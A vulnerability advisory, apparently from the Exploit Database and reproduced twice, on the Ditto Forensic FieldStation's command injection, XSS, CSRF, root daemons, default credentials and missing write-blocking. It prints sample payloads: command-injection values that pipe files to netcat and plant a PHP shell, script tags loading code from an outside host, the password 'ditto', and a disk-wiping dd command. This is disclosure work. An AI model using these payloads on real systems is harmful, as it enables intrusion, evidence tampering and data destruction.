**************************************************************
Title: Ditto Forensic FieldStation, multiple vulnerabilities
Versions affected: <= 2013Oct15a (all)
Vendor: CRU Wiebetech
Discovered by: Martin Wundram
Email: wundram@digitrace.de
Date found:     2013-04-22
Date published: 2013-12-12
Status: partially patched
**************************************************************

0] ======== Introduction / Background / Impact ========
In computer forensics (http://en.wikipedia.org/wiki/Computer_forensics) one
essential requirement is that evidence data does not get modified at all (or
not unnoticed, at least). Therefore IT forensic experts use write-blockers to
ensure a read-only access to evidence data like hard disks or USB mass
storage.

The Ditto Forensic FieldStation is such a special equipment (hardware with
embedded software) used by forensic experts to analyse and copy evidence data
in a safe and secure way. The ditto is explicitly marketed as a device to
acquire data from network file shares, too. This means it is meant to be
connected to possibly hostile networks of suspects.

However it was found to be vulnerable up to the point of not being reliable as
a computer forensic device.

1] ======== OS Command Injection ========
Class: Command Injection [CWE-77]
Impact: Code execution
Remotely Exploitable: Yes
CVE Name: CVE-2013-6881
CVSS v2 Base Score: 10
Overall CVSS v2 Score: 9.2
CVSS v2 Vector:
(AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)

Several input fields of the web application are vulnerable to OS command
injection. E.g. the application allows the setting of parameters like 'sector
size' or 'skip count' for a forensic imaging task. Because of improper
neutralization in combination with the web server running with root
privileges, an attacker is able to access and manipulate the complete system.

Example 1 (setting of 'sector size' = 1 with malicious content):

  1;cat /opt/web/htdocs/index.php | nc 192.168.1.1 6666;

Example 2 (setting of 'set-size' = 1 with copying a PHP shell from
  the external SD card):

  1;cp /ditto/shell.php /opt/web/htdocs;

2] ======== Persistent XSS ========
Class: Cross-site Scripting [CWE-79]
Impact: Code execution
Remotely Exploitable: Yes
Status: unpatched
CVE Name: CVE-2013-6882
CVSS v2 Base Score: 9
Overall CVSS v2 Score (if patched): 9.2
CVSS v2 Vector:
(AV:N/AC:L/Au:N/C:P/I:C/A:P/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)
Overall CVSS v2 Score (unpatched): 10

The web application suffers from multiple vulnerabilities regarding XSS. The
first one (a) is critical because an unauthorized attacker is able to push
malicious code into the system and consequently attacking every user. The
other ones (b) need authentication first.

a) The web application logs every login (including the username) in a not
sanitized way to a system log. Additionally, the web application embeds that
system log rendered as HTML into the start page of every user who successfully
logs in. Thus an unprivileged attacker can persistently inject malicious code
which attacks all users of the vulnerable system immediately after their
login.

Example:

POSTDATA=
   user=demo%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
                           &pass=demo&login=Log+In

b) It is easily possible to submit malicious data as input into multiple HTML
form fields (e.g. one can force the system to load externally hosted
JavaScript code with <script src=http://www.hacker.tld/code.js></script>).
This can result in dangerous situations where the (external) JavaScript code
mangles the information displayed about important computer forensic key values
whose integrity is crucial.

Example:
   784 PetaByte (PB) source disk instead of 32 GB, investigator "Al Capone",
     "verify actions: yes" instead of "no", ...

3] ======== Cross-Site Request Forgery ========
Class: Cross-Site Request Forgery [CWE-352]
Impact: Application misuse
Remotely Exploitable: Yes
CVE Name: CVE-2013-6883
CVSS v2 Base Score: 6.6
Overall CVSS v2 Score: 8
CVSS v2 Vector:
(AV:N/AC:H/Au:N/C:P/I:C/A:P/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)

The web application is vulnerable to attacks using Cross-Site Request Forgery.
E.g. the disk erase technique (correct settings are important for the reliable
deletion of sensitive forensic data) can be changed with a simple POST
request.

4] ======== Misconfigured Daemon Rights ========
Class: Configuration [CWE-16]
Impact: Full system access

The web server lighthttpd and the PHP engine are run as user 'root'. Thus
injection weaknesses in the 'ditto' web application result in immediate full
system access.

5] ======== Unneeded Daemons/Software ========
Class: Configuration [CWE-16]
Impact: Attackable services
Best matching CCE-ID: CCE-4268-9

Forensic usage needs only write-blocking and imaging of evidence data.
However, the base system contains further active software and services. This
helps attacking the system and escalating privileges. The tools/daemons are
especially netcat and an active SSHd. Furthermore, the SSHd binds to the
network port which is labeled as 'source' and thus intended for usage in
supposedly hostile network environments - the network containing evidence data
from suspects.

6] ======== Use of standard credentials ========
Class: Use of Hard-coded Credentials [CWE-798]
Impact: unwanted full system access
Remotely Exploitable: Yes
CVE Name: CVE-2013-6884
CVSS v2 Base Score: 10
Overall CVSS v2 Score: 9.2
CVSS v2 Vector:
(AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)

The ditto write-blocker contains a default system user named 'ditto' with the
default password 'ditto' which is allowed to elevate its user rights to root
(sudo) without further authentication. In combination with the active SSHd,
this vulnerability allows attackers full access to the ditto if it gets
connected to the same/reachable network.

7] ======== Misconfigured Core System ========
Class: Configuration [CWE-16]
Impact: Alteration of evidence data
Remotely Exploitable: Yes

Although explicitly marketed as a hardware write-blocker, the ditto does not
implement any specific write-blocking mechanism at all. The underlying system
is able to manipulate or even erase evidence on devices which are connected to
the 'source side' of the ditto. The problem is: no hardware-level, no driver-
level and no kernel-level (blockdev) write-blocking are implemented. Only the
web application prevents the user from writing to the source media. That is
just security by obscurity. Finally, every critical weakness or simple
malfunction in the web application can potentiallly lead to overwriting of
source/evidence data.

Furthermore, the embedded Linux system itself mounts the system partition as
writable. Thus malware could be persistently deployed!

Example:
  One can simply overwrite supposedly write-protected source data (USB stick
and
SATA disk) with
     dd if=/dev/zero of=/dev/sda.

8] ======== Solution ========
Upgrade your ditto to the newest available firmware (2013Oct15a). Don't
connect the device to potentially hostile networks. Examine your device if it
has been manipulated at an earlier time (has someone placed a backdoor in the
embedded Linux, or a malware which silently manipulates evidence data or
copies of evidence data?).

9] ======== Report Timeline ========
2013-04-22 Discovery of vulnerabilities
2013-04-23 First contact with vendor including agreement about later public
           disclosure
2013-04-26 Detailed information about vulnerabilities provided to vendor
2013-06-30 Vendor fixes some vulnerabilities with firmware 2013Jun30a
2013-10-15 Vendor fixes some vulnerabilities with firmware 2013Oct15a
2013-11-26 Information with details provided to vendor about upcoming public
           disclosure. Vendor gave feedback regarding technical accuracy of
           this report
2013-12-12 Public disclosure

10] ======== Discussion ========
Because integrity is of utmost importance during the forensic process (correct
handling of evidence data and correct deduction of conclusions and
implications), even small vulnerabilities in forensic tools and devices become
critical.

##### About The Exploit Database

Ã

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as âGoogle Hackingâ was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnyâs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term âGoogledorkâ to refer
to âa foolish or inept person as revealed by Googleâ. This was meant to draw attention to
the fact that this was not a âGoogle problemâ but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term âdorkâ became shorthand for a search query that located sensitive
information and âdorksâ were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

**************************************************************
Title: Ditto Forensic FieldStation, multiple vulnerabilities
Versions affected: <= 2013Oct15a (all)
Vendor: CRU Wiebetech
Discovered by: Martin Wundram
Email: wundram () digitrace de
Date found:     2013-04-22
Date published: 2013-12-12
Status: partially patched
**************************************************************

0] ======== Introduction / Background / Impact ========
In computer forensics (<http://en.wikipedia.org/wiki/Computer_forensics>) one
essential requirement is that evidence data does not get modified at all (or
not unnoticed, at least). Therefore IT forensic experts use write-blockers to
ensure a read-only access to evidence data like hard disks or USB mass
storage.

The Ditto Forensic FieldStation is such a special equipment (hardware with
embedded software) used by forensic experts to analyse and copy evidence data
in a safe and secure way. The ditto is explicitly marketed as a device to
acquire data from network file shares, too. This means it is meant to be
connected to possibly hostile networks of suspects.

However it was found to be vulnerable up to the point of not being reliable as
a computer forensic device.

1] ======== OS Command Injection ========
Class: Command Injection [CWE-77]
Impact: Code execution
Remotely Exploitable: Yes
CVE Name: CVE-2013-6881
CVSS v2 Base Score: 10
Overall CVSS v2 Score: 9.2
CVSS v2 Vector:
(AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)

Several input fields of the web application are vulnerable to OS command
injection. E.g. the application allows the setting of parameters like 'sector
size' or 'skip count' for a forensic imaging task. Because of improper
neutralization in combination with the web server running with root
privileges, an attacker is able to access and manipulate the complete system.

Example 1 (setting of 'sector size' = 1 with malicious content):

  1;cat /opt/web/htdocs/index.php | nc 192.168.1.1 6666;

Example 2 (setting of 'set-size' = 1 with copying a PHP shell from
  the external SD card):

  1;cp /ditto/shell.php /opt/web/htdocs;

2] ======== Persistent XSS ========
Class: Cross-site Scripting [CWE-79]
Impact: Code execution
Remotely Exploitable: Yes
Status: unpatched
CVE Name: CVE-2013-6882
CVSS v2 Base Score: 9
Overall CVSS v2 Score (if patched): 9.2
CVSS v2 Vector:
(AV:N/AC:L/Au:N/C:P/I:C/A:P/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)
Overall CVSS v2 Score (unpatched): 10

The web application suffers from multiple vulnerabilities regarding XSS. The
first one (a) is critical because an unauthorized attacker is able to push
malicious code into the system and consequently attacking every user. The
other ones (b) need authentication first.

a) The web application logs every login (including the username) in a not
sanitized way to a system log. Additionally, the web application embeds that
system log rendered as HTML into the start page of every user who successfully
logs in. Thus an unprivileged attacker can persistently inject malicious code
which attacks all users of the vulnerable system immediately after their
login.

Example:

POSTDATA=
   user=demo%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
                           &pass=demo&login=Log+In

b) It is easily possible to submit malicious data as input into multiple HTML
form fields (e.g. one can force the system to load externally hosted
JavaScript code with <script src=<http://www.hacker.tld/code.js>></script>).
This can result in dangerous situations where the (external) JavaScript code
mangles the information displayed about important computer forensic key values
whose integrity is crucial.

Example:
   784 PetaByte (PB) source disk instead of 32 GB, investigator "Al Capone",
     "verify actions: yes" instead of "no", ...

3] ======== Cross-Site Request Forgery ========
Class: Cross-Site Request Forgery [CWE-352]
Impact: Application misuse
Remotely Exploitable: Yes
CVE Name: CVE-2013-6883
CVSS v2 Base Score: 6.6
Overall CVSS v2 Score: 8
CVSS v2 Vector:
(AV:N/AC:H/Au:N/C:P/I:C/A:P/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)

The web application is vulnerable to attacks using Cross-Site Request Forgery.
E.g. the disk erase technique (correct settings are important for the reliable
deletion of sensitive forensic data) can be changed with a simple POST
request.

4] ======== Misconfigured Daemon Rights ========
Class: Configuration [CWE-16]
Impact: Full system access

The web server lighthttpd and the PHP engine are run as user 'root'. Thus
injection weaknesses in the 'ditto' web application result in immediate full
system access.

5] ======== Unneeded Daemons/Software ========
Class: Configuration [CWE-16]
Impact: Attackable services
Best matching CCE-ID: CCE-4268-9

Forensic usage needs only write-blocking and imaging of evidence data.
However, the base system contains further active software and services. This
helps attacking the system and escalating privileges. The tools/daemons are
especially netcat and an active SSHd. Furthermore, the SSHd binds to the
network port which is labeled as 'source' and thus intended for usage in
supposedly hostile network environments - the network containing evidence data
from suspects.

6] ======== Use of standard credentials ========
Class: Use of Hard-coded Credentials [CWE-798]
Impact: unwanted full system access
Remotely Exploitable: Yes
CVE Name: CVE-2013-6884
CVSS v2 Base Score: 10
Overall CVSS v2 Score: 9.2
CVSS v2 Vector:
(AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)

The ditto write-blocker contains a default system user named 'ditto' with the
default password 'ditto' which is allowed to elevate its user rights to root
(sudo) without further authentication. In combination with the active SSHd,
this vulnerability allows attackers full access to the ditto if it gets
connected to the same/reachable network.

7] ======== Misconfigured Core System ========
Class: Configuration [CWE-16]
Impact: Alteration of evidence data
Remotely Exploitable: Yes

Although explicitly marketed as a hardware write-blocker, the ditto does not
implement any specific write-blocking mechanism at all. The underlying system
is able to manipulate or even erase evidence on devices which are connected to
the 'source side' of the ditto. The problem is: no hardware-level, no driver-
level and no kernel-level (blockdev) write-blocking are implemented. Only the
web application prevents the user from writing to the source media. That is
just security by obscurity. Finally, every critical weakness or simple
malfunction in the web application can potentiallly lead to overwriting of
source/evidence data.

Furthermore, the embedded Linux system itself mounts the system partition as
writable. Thus malware could be persistently deployed!

Example:
  One can simply overwrite supposedly write-protected source data (USB stick
and
SATA disk) with
     dd if=/dev/zero of=/dev/sda.

8] ======== Solution ========
Upgrade your ditto to the newest available firmware (2013Oct15a). Don't
connect the device to potentially hostile networks. Examine your device if it
has been manipulated at an earlier time (has someone placed a backdoor in the
embedded Linux, or a malware which silently manipulates evidence data or
copies of evidence data?).

9] ======== Report Timeline ========

           disclosure

10] ======== Discussion ========
Because integrity is of utmost importance during the forensic process (correct
handling of evidence data and correct deduction of conclusions and
implications), even small vulnerabilities in forensic tools and devices become
critical.
